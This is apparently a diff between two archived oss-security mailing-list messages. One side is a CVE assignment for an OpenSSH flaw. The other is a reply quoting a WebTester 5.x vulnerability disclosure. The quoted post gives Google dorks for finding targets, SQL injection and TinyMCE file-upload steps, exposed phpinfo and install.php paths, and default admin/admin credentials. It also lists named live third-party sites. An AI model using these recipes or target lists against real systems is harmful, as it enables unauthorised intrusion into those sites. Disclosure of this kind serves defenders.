@@ -1,61 +1,133 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/11/08/3
-Message-ID: <527C89D2.1080703@redhat.com>
-Date: Thu, 07 Nov 2013 23:50:58 -0700
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/10/16/4
+Message-ID: <525E2633.8020802@redhat.com>
+Date: Tue, 15 Oct 2013 23:37:55 -0600
 From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com, markus@...nbsd.org
-Subject: Re: CVE Request - OpenSSH
+To: oss-security@...ts.openwall.com
+Subject: Re: WebTester 5.x Multiple Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 11/07/2013 09:02 PM, mancha wrote:
-> Hello Kurt, vendors, et al.
+On 10/15/2013 07:30 PM, X-Cisadane wrote:
+> ==========================================================================================
+>  WebTester 5.x Multiple Vulnerabilities 
+> ==========================================================================================
 > 
-> OpenSSH has released an advisory[1] detailing a memory corruption 
-> vulnerability in the post-authentication sshd process when using
-> an aes*-gcm@...nssh.com cipher.
 > 
-> OpenSSH 6.4/6.4p1 were released to address the problem.
+> :--------------------------------------------------------------------------------------------------------------------------
+>
+>  --------------: : # Exploit Title : WebTester 5.x Multiple
+> Vulnerabilities : # Date : 15 October 2013 : # Author : X-Cisadane
+>  : # CMS Developer : http://epplersoft.com/webtester.html : # CMS
+> Source Code : http://sourceforge.net/projects/webtesteronline/ : #
+> Version : ALL : # Category : Web Applications : # Vulnerability :
+> SQL Injection, Arbitrary File Upload, PHPInfo() Disclosure,
+> Leftover install.php File : # Tested On : Google Chrome Version
+> 26.0.1410.64 m (Windows XP SP 3 32-Bit English) : # Greetz to :
+> X-Code, Borneo Crew, Depok Cyber, Explore Crew, CodeNesia, Bogor-H,
+> Jakarta Anonymous Club, Jabar Cyber,
 > 
-> Would you please allocate a CVE for this issue? Thanks.
+> Winda Utari 
+> :--------------------------------------------------------------------------------------------------------------------------
+>
+>  --------------:
 > 
-> --mancha
+> DORKS (How to find the target) : ================================ 
+> intext:Copyright © 2003 - 2010 Eppler Software 
+> inurl:/go.php?testID= intitle:WebTester Online Testing Or use your
+> own Google Dorks :)
 > 
-> [1] http://www.openssh.com/txt/gcmrekey.adv
+> Proof of Concept ================
 > 
+> [ 1 ] SQL Injection POC : 
+> http://[Site]/[Path]/startTest.php?FirstName=a&LastName=a&TestID=['SQLi]
+>  Example : 
+> http://simuladodireitocespe.com/startTest.php?FirstName=a&LastName=a&TestID='5
+>  
+> http://www.huertos.eu/encuesta/startTest.php?FirstName=a&LastName=a&TestID='5
+>  
+> http://autoskola-buratrans.com/templates/default/ispiti/startTest.php?FirstName=a&LastName=a&TestID='5
+>  
+> http://conalepnl091.sytes.net/simulador/startTest.php?FirstName=a&LastName=a&TestID='5
+>  
+> http://learnin.elschool.pl/startTest.php?FirstName=a&LastName=a&TestID='5
+>  ...etc...
 
-- From the advisory:
 
-If exploited, this vulnerability might permit code execution
-with the privileges of the authenticated user and may
-therefore allow bypassing restricted shell/command
-configurations.
 
-So based on that it sounds like a security issue.
+> [ 2 ] Arbitrary File Upload through TinyMCE (plugins/filemanager)
+>  Webster 5.x has a built-in WYSIWYG Editor, that is TinyMCE. The
+> attacker can upload file through the TinyMCE File Manager. It can
+> be found in tiny_mce/plugins/filemanager.
+> 
+> Poc : 
+> http://[Site]/[Path]/tiny_mce/plugins/filemanager/InsertFile/insert_file.php
+>  Example the target is http://onlinetests.germaniak.eu/ Change the
+> url to 
+> http://onlinetests.germaniak.eu/tiny_mce/plugins/filemanager/InsertFile/insert_file.php
+>  Pic #1 : http://i40.tinypic.com/117z390.png Then tick : Insert
+> filetype icon, Insert file size & Insert file modification date. 
+> Click upload and wait until the file sent to the server. Pic #2 :
+> http://i39.tinypic.com/2wluaon.png Pic #3 :
+> http://i40.tinypic.com/2uh0fir.png If the file was successfully
+> uploaded, check in the /test-images/ directory. For Example : 
+> http://onlinetests.germaniak.eu/test-images/ 
+> http://www.rzecznik.org/test/test-images/ 
+> http://simula.se/fun/webtester5/test-images/ 
+> http://811lifestylecoach.com/test-images/ 
+> http://umpire-test.splashprojects.co.uk/test-images/ 
+> http://zamoweb.altervista.org/test-images/ ...etc...
 
-Please use CVE-2013-4548 for this issue.
 
-CC'ing Markus in case he already requested a CVE.
 
+> [ 3 ] PHPInfo() Disclosure POC : http://[Site]/[Path]/phpinfo.php 
+> Example : 
+> http://mhsquiz.marbleheadschools.org/webtester/phpinfo.php 
+> http://test.auzefiu.com/phpinfo.php 
+> http://test.deltaschools.com/phpinfo.php 
+> http://www.noordskool.com/toetse/phpinfo.php 
+> http://bocahomehealth.com/exam/phpinfo.php ...etc...
+
+
+> [ 4 ] Leftover install.php File POC :
+> http://[Site]/[Path]/install.php Example : 
+> http://www.ibeucamposmacae.com.br/webtester5/install.php 
+> http://briefhealthprograms.com/webtester5/install.php 
+> http://intgvna.gardnervna.org/test/install.php 
+> http://delarcollege.com/POSTUTME/install.php 
+> http://www.orionhs.org/webtester/install.php ...etc...
+
+How is this a security issue specifically? can you run the installer
+again or something?
+
+> 
+> Bonus : Default Username and Password Username : admin Password :
+> admin Admin Control Panel : http://[Site]/[Path]/admin/
+> 
+> Sent from my BlackBerry® smartphone from Sinyal Bagus XL, Nyambung 
+> Teruuusss...! 
+> ------------------------------------------------------------------------
+>
+> 
 - -- 
 Kurt Seifried Red Hat Security Response Team (SRT)
 PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.15 (GNU/Linux)
 
-iQIcBAEBAgAGBQJSfInSAAoJEBYNRVNeJnmTRlcQAKkAk98ZEoqbqZYo7QOyTfud
-miK44LqEBK2p4moyFdC6OlGQsiDQpz86ekge/f4STbiBuCOSedvUEGaC8sqBiP5u
-xOTXPIt0AtR0IIdg3jnVtK/YgHBLjp+dB1iFUjLd4N6KnQRqYyjLA4QkHlfKW4iv
-OI2qdeoHIk8OHYqcygudsq2o2FsyaH2WfNWqtPcT0Sc0LuLqKgjrX4KPrcHRw9ho
-QWkBWxsdUJW9CJYhk2ncs/NvScNSkWRPGBKITAjvBW8l+JYpW2CESGnuKLMEwLF5
-V+DbmHbBzVkTws7C+ZFVvQZxCZhxbwTjN+v8q98oX/buKI+yCxJeM4oUG2qTFAA1
-cqqarbFURhBQvj/qTUB/PVAtuOLhFH0APjV9ltfBB5glGHrPMNIxI+zknCwELMQd
-qWotcMZc1XadnE97bvLKytY/1yxh72v1gJmWWTCdGxY+gf0nBTvxi7wXYSGKFlzW
-Luk8mTfiD0p1fgxGAsSdbfFQ1S5Er+Uh+/5w9pwfo3qoeiuWGwTeTFM2sRMRosmh
-epH//OVrGxQmDHkVdDjt+wdhheWLn613koQo91w7csoRFjrtaI3yUIpAAXZ50ezN
-VH2pqciEoNid0ezI9OU+LgDXuOyo1g4BsQDNbirvrLs12iK8gxgaq+DUrsh182Cr
-KiEs8ppMg1MIEJieRzPe
-=b+P6
+iQIcBAEBAgAGBQJSXiYyAAoJEBYNRVNeJnmTJagP/3vj0hzF3sBWrnz1n5GBMGQd
+xiEf5jnoyYNEwQzkHg6BF9yxB4o6Q1Px5hN51F4GMuHtorfiMMOP8qmB/1VXtXbt
+O3vwNX9LE3SspSX6SCTn0/2mYsEyNjV2jwUia+Y2I8txTGGRglTjF+/BIYnFQLvV
+4eVaN0B+9Xu1PAiia/KyHHsg5sbREa9h1SoWok+2aUyqnnq6YUbOzWzhcSKjuXJt
+tjBKWGp3XqigERxH87KPzuzkkxxlt1xgy5dURT6f2o0rHCJkhRwDKVuDCIJp70+B
+P4bU9jnxwOXnanFaHq1dzmoj1Y3RyX2T58KQIdDVwXYaD+BIAabuGVSvTmAxktM6
+FfbZtQZTB1TTurb/yO3GGFUq7PP9cst/57M3aVT6+LdUzCGxbRclFGnVDI9rYSWT
+HIi+yme2I2ALxxRQQAp9vW4f7VNvPzdAsMLCzEeYskjQKV2jQB5VFjwCIZ7lXZCE
+B6bjsifGHYXfhHK0Oqs75Hj6CpHtY9bTQmN7pUGNGb9tGEHuCn6AUkPeMo+nL1eN
+aeC8dGlNTGMIxEIVjE7yTq3MkNyUcCkTfZG2KsrYVotWxYOfksK00E4IcQweYKE9
+mgMBAz2BeIJKsEPP/4E8IQxU7/gHnvAf3cy6KR9bIFr26R7P0e+7hqqtKKboztPr
+Gx30g5X9B1IeyNKunmSc
+=10xl
 -----END PGP SIGNATURE-----
